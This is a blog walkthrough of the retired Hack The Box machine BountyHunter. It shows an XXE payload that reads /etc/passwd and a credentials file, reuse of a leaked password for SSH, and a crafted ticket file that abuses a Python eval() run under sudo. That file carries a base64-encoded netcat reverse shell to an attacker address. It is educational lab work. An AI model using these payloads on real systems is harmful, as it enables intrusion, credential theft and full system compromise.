---
layout: single
title: "Walktrough: HTB BountyHunter"
namespace: htb-bountyhunter
category: Walkthrough
tags:
  - HackTheBox
  - HTB Easy
  - HTB Linux
date: 2021-07-03 16:00:00
header:
   teaser: https://i.imgur.com/6MsWc2i.png
---

Hello guys!

This week's machine will be **BountyHunter**, an easy-rated Android box from [Hack The Box](https://www.hackthebox.eu/), created by [ejedev](https://app.hackthebox.eu/users/280547).<!--more-->

:information_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they’re retired.
{: .notice--info}

![HTB BountyHunter](https://i.imgur.com/CndNDLB.png){: .align-center}

add **Comment**

## Enumeration

As usual, started with a quick `nmap` scan to see which services are published

```bash
$ nmap -sC -sV -Pn -oA quick 10.10.11.100
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-19 09:02 -03
Nmap scan report for 10.10.11.100
Host is up (0.072s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.65 seconds
```

### 80/TCP - HTTP Service

Starting with the HTTP Service, noticed that this is an institutional page for a bounty hunters group.

![HTB BountyHunters - HTTP WebSite](https://i.imgur.com/Z6ItoRV.png){: .align-center}

Analyzing the references and comments using `curl` nothing interesting was found, besides the **Portal** link already available through normal browsing. Also, checking page components, this doesn't seem to be anything we could achieve something, as doesdoesn'took like a CMS platform

```bash
$ whatweb http://10.10.11.100
http://10.10.11.100 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.100], JQuery, Script, Title[Bounty Hunters]
```

As we've confirmed that this application runs `*.php` files, started a `gobuster dir` enumeration, where I have found an interesting file `db.php` but it isn't returning anything as response size is 0.

```bash
$ gobuster dir -u http://10.10.11.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o ./gobuster.txt -x html,txt,php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.100
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
2021/08/19 10:27:21 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 25169]
/resources            (Status: 301) [Size: 316] [--> http://10.10.11.100/resources/]
/assets               (Status: 301) [Size: 313] [--> http://10.10.11.100/assets/]
/portal.php           (Status: 200) [Size: 125]
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.100/css/]
/db.php               (Status: 200) [Size: 0]
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.100/js/]
/server-status        (Status: 403) [Size: 277]
Progress: 748484 / 882244 (84.84%)
```

Accessing the portal page we just have a notice informing us that the portal is under development and we can test the bounty tracker via `/log_submit.php`

```html
<html>
<center>
Portal under development. Go <a href="log_submit.php">here</a> to test the bounty tracker.
</center>
</html>
```

The bounty tracker page is pretty simple as we can see below. When informing data through this form it prints the data that would be added to the database if it was configured.

![HTB BountyHunters - Bounty Reporting System](https://i.imgur.com/TnOEmCu.png){: .align-center}

Inspecting the webpage, it imports a javascript called `bountylog.js`, from which a method called `bountySubmit()` is invoked when the form is submitted

```html
html>
<head>
<script src="/resources/jquery.min.js"></script>
<script src="/resources/bountylog.js"></script>
</head>
<center>
<h1>Bounty Report System - Beta</h1>
<input type="text" id = "exploitTitle" name="exploitTitle" placeholder="Exploit Title">
<br>
<input type="text" id = "cwe" name="cwe" placeholder="CWE">
<br>
<input type="text" id = "cvss" name="exploitCVSS" placeholder="CVSS Score">
<br>
<input type="text" id = "reward" name="bountyReward" placeholder="Bounty Reward ($)">
<br>
<input type="submit" onclick = "bountySubmit()" value="Submit" name="submit">
<br>
<p id = "return"></p>
<center>
</html>
```

The `bountySubmit()` function generates a Base64 encoded content of an XML, which is later updated using ajax from `returnSecret()`, which posts the data `/tracker_diRbPr00f314.php` and loads it on the same page.

```javascript
function returnSecret(data) {
    return Promise.resolve($.ajax({
        type: "POST",
        data: {"data":data},
        url: "tracker_diRbPr00f314.php"
    }));
}

async function bountySubmit() {
    try {
        var xml = `<?xml  version="1.0" encoding="ISO-8859-1"?>
        <bugreport>
        <title>${$('#exploitTitle').val()}</title>
        <cwe>${$('#cwe').val()}</cwe>
        <cvss>${$('#cvss').val()}</cvss>
        <reward>${$('#reward').val()}</reward>
        </bugreport>`
        let data = await returnSecret(btoa(xml));
        $("#return").html(data)
    }
    catch(error) {
        console.log('Error:', error);
    }
}
```

Based on this checking, as we're handling a XML file this web application could be vulnerable to **XXE (XML External Entity).**

## Initial Access and User flag

To confirm the vulnerability, made some adjustments on the XML posted to the web application following some of the suggestions on [detecting the vulnerability, from PayloadsAllTheThings/XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#detect-the-vulnerability), posting the data below Base64 encoded and then URL Encoded. This will return the contents of `/etc/passwd` file, as well as the base64 encoded content of `db.php`, previously enumerated.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
    <!ELEMENT foo ANY>
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<bugreport>
    <title>&xxe;</title>
    <cwe>1</cwe>
    <cvss>2</cvss>
    <reward>3</reward>
</bugreport>
```

The result obtained confirmed the vulnerability :smiley:

```html
HTTP/1.1 200 OK
Date: Thu, 19 Aug 2021 14:59:25 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 2344
Connection: close
Content-Type: text/html; charset=UTF-8

If DB were ready, would have added:
<table>
  <tr>
    <td>Title:</td>
    <td>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
</td>
  </tr>
  <tr>
    <td>CWE:</td>
    <td>PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=</td>
  </tr>
  <tr>
    <td>Score:</td>
    <td>1</td>
  </tr>
  <tr>
    <td>Reward:</td>
    <td>2</td>
  </tr>
</table>
```

Before trying to convert this into an RCE, inspected the base64 encoded content of `db.php` and we have found some credentials

```bash
$ echo -n 'PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=' | base64 -d
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

Considering the users we might have console access, from `/etc/passwd` we might have access with `development` account.

```bash
$ cat passwd| grep -E -v 'nologin|false'
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
development:x:1000:1000:Development:/home/development:/bin/bash
```

Reusing these credentials for the development account, I successfully connected via SSH and obtained the `user.txt` flag.

```bash
$ ssh development@10.10.11.100
development@10.10.11.100's password:
development@bountyhunter:~$ cat user.txt
<redacted>
```

## Root flag

Besides the `user.txt` flag, found a file `contract.txt` with the following content:

```bash
development@bountyhunter:~$ cat contract.txt
Hey team,

I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.

This has been our first job since the "rm -rf" incident and we can't mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.

I set up the permissions for you to test this. Good luck.

-- John
```

Also executing `sudo -l` found some `sudo` permissions for this user

```bash
development@bountyhunter:~$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

The content of the `ticketValidator.py` is placed below

```python
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

Considering this script, I have written a `ticket.md` file so I could reach the `eval()` built-in function, which executes code and evaluates its results. After several attempts, noticed that eval wouldn't work with line breaks like `;` or `\n` inside the string. The solution was to create a comparison of two evaluations, being the first part the requirements so I could reach the `code_line` and the second, joint by the `and` operator (but would work with any other logical operator available), containing another comparison with one of the operators an instruction to spawn a reverse shell

```bash
# Victim Machine
development@bountyhunter:/dev/shm$ cat ticket.md
# Skytrain Inc
## Ticket to John Doe
__Ticket Code:__
**11+90 == 101 and __import__('os').system('echo -n cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTQuMTI1IDQ0NDMgPi90bXAvZg== | base64 -d | bash -') == True

development@bountyhunter:/dev/shm$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
/dev/shm/ticket.md
Destination: John Doe
```

```bash
# Attacker Machine
$ nc -lnvp 4443
listening on [any] 4443 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.11.100] 38304
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
<redacted>
```

I hope you guys have enjoyed it!

See you in the next post :smile:
